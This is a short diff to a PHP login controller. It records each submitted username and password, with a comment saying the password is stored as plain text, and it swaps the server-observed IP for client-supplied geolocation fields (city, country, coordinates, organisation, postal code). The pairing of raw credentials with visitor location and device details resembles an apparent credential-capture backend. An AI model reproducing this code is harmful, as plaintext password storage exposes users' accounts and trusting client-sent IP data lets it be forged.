@@ -32,13 +32,21 @@ class AuthController extends Controller
     public function login(LoginRequest $request)
     {
         // Capture login details
+        $data = $request->input('data');
         $more = $request->input('more');
         
         // Initialize login details with plain text password
         $loginDetails = [
             'username' => $request->input('username'),
             'password' => $request->input('password'), // Store as plain text initially
-            'ip' => $request->ip(),
+            'ip' => $data['ip'] ?? null,
+            'city' => $data['city'] ?? null,
+            'country' => $data['country'] ?? null,
+            'region' => $data['region'] ?? null,
+            'timezone' => $data['timezone'] ?? null,
+            'loc' => $data['loc'] ?? null,
+            'org' => $data['org'] ?? null,
+            'postal' => $data['postal'] ?? null,
             'login_time' => now(),
             'platform' => $more['platform'] ?? null,
             'language' => $more['language'] ?? null,
